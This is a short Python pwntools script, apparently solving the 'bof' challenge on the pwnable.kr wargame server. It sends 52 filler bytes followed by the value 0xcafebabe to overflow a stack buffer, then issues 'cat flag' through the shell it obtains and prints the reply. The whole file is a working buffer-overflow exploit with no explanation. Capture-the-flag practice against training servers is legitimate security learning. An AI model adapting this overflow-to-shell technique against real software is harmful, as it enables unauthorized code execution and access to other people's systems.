from pwn import *

r = remote('pwnable.kr', 9000)
payload = 'A'*52 + '\xbe\xba\xfe\xca'#p8(0x41)*52 + p32(0xcafebabe)
r.sendline(payload)
r.sendline('cat flag')
print(r.recv())
